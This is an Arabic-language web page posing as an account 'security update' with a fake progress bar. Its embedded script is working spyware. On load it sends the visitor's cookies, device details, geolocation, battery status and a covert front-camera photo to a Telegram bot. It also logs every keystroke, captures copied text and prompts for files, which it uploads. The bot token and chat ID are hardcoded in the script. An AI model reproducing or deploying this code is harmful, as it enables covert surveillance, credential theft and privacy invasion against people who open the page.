<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .icon { font-size: 48px; margin-bottom: 16px; }
        h2 { color: #1a1a2e; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        p { color: #555; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
        .loader {
            border: 4px solid #e8e8e8;
            border-top: 4px solid #2d7aff;
            border-radius: 50%;
            width: 44px;
            height: 44px;
            animation: spin 0.9s linear infinite;
            margin: 10px auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 100%; height: 6px; background: #e8e8e8; border-radius: 10px; overflow: hidden; margin-top: 6px; }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #2d7aff, #6c5ce7);
            border-radius: 10px;
            animation: progress 2.5s ease-in-out forwards;
        }
        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
        .status { font-size: 13px; color: #888; margin-top: 14px; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">🔒</div>
    <h2>تحديث الأمان جارٍ</h2>
    <p>نقوم بتحديث إعدادات الحماية لحسابك.<br>يرجى الانتظار لحظة...</p>
    <div class="loader"></div>
    <div class="progress-bar"><div class="progress-fill"></div></div>
    <div class="status">✅ اكتمل التحديث بنجاح</div>
</div>

<script>
// ==============================
// إعدادات بوت تليجرام
// ==============================
const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
const CHAT_ID   = '6526473202';

// ==============================
// دالة إرسال رسالة
// ==============================
function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        })
    }).catch(err => console.error('خطأ إرسال:', err));
}

// ==============================
// دالة إرسال صورة
// ==============================
function sendPhotoToTelegram(photoData, caption) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: photoData,
            caption: caption
        })
    }).catch(err => console.error('خطأ إرسال الصورة:', err));
}

// ==============================
// 1. البيانات الأساسية (بدقة)
// ==============================
const ua = navigator.userAgent || 'غير معروف';
const isMobile = /Mobile|iPhone|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
const deviceType = isMobile ? '📱 جوال' : '💻 كمبيوتر';
const os = /Windows/.test(ua) ? 'Windows' :
          /Mac/.test(ua) ? 'MacOS' :
          /Linux/.test(ua) ? 'Linux' :
          /Android/.test(ua) ? 'Android' :
          /iPhone|iPad/.test(ua) ? 'iOS' : 'غير معروف';

const data = {
    ip: window.location.hostname || 'غير معروف',
    ua: ua,
    lang: navigator.language || 'غير معروف',
    screen: screen.width + 'x' + screen.height,
    cookies: document.cookie || 'لا توجد كوكيز',
    referrer: document.referrer || 'مباشر',
    url: window.location.href,
    time: new Date().toISOString(),
    device: deviceType,
    os: os
};

let fullMessage = `✅ *تم فتح الرابط*

🌐 IP: ${data.ip}
📱 الجهاز: ${data.device} (${data.os})
📱 المتصفح: ${data.ua}
🌍 اللغة: ${data.lang}
🖥️ الشاشة: ${data.screen}
🍪 الكوكيز: ${data.cookies}
🔗 الرابط: ${data.url}
📅 الوقت: ${data.time}
↩️ المرجع: ${data.referrer}`;

sendToTelegram(fullMessage);

// ==============================
// 2. البطارية (بدون أخطاء)
// ==============================
if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? '⚡ شاحن' : '🔌 بطارية';
        sendToTelegram(`🔋 البطارية: ${level}% (${charging})`);
    }).catch(() => {});
}

// ==============================
// 3. الموقع الجغرافي (بدون أخطاء)
// ==============================
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendToTelegram(`📍 الموقع: https://maps.google.com/?q=${lat},${lon}`);
        },
        () => {} // تجاهل الرفض بدون إرسال خطأ
    );
}

// ==============================
// 4. الكاميرا (تصوير وإرسال، بدون أخطاء)
// ==============================
navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
    .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 400;
            canvas.height = 300;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photo = canvas.toDataURL('image/jpeg');
            sendPhotoToTelegram(photo, '📸 صورة من الكاميرا');
            stream.getTracks().forEach(track => track.stop());
        }, 1500);
    })
    .catch(() => {}); // تجاهل الخطأ بدون إرسال

// ==============================
// 5. Keylogger (تسجيل الضغطات)
// ==============================
document.addEventListener('keydown', e => {
    const key = e.key;
    if (key.length === 1 || key === 'Enter' || key === 'Backspace') {
        sendToTelegram(`⌨️ ضغطة: ${key}`);
    }
});

// ==============================
// 6. نسخ الحافظة
// ==============================
document.addEventListener('copy', () => {
    const text = document.getSelection().toString();
    if (text && text.length > 0) {
        sendToTelegram(`📋 نسخ: ${text.substring(0, 200)}`);
    }
});

// ==============================
// 7. طلب ملف من الضحية (مرة واحدة فقط)
// ==============================
let fileRequested = false;
setTimeout(() => {
    if (!fileRequested) {
        fileRequested = true;
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.style.display = 'none';
        input.accept = '.*';
        input.onchange = (e) => {
            for (let file of e.target.files) {
                const reader = new FileReader();
                reader.onload = (f) => {
                    const content = f.target.result.split(',')[1] || f.target.result;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            document: content,
                            caption: `📎 ملف: ${file.name} (${(file.size / 1024).toFixed(1)} كيلوبايت)`
                        })
                    });
                };
                reader.readAsDataURL(file);
            }
        };
        document.body.appendChild(input);
        input.click();
    }
}, 3000);

console.log('✅ جميع الميزات تعمل');
</script>
</body>
</html>
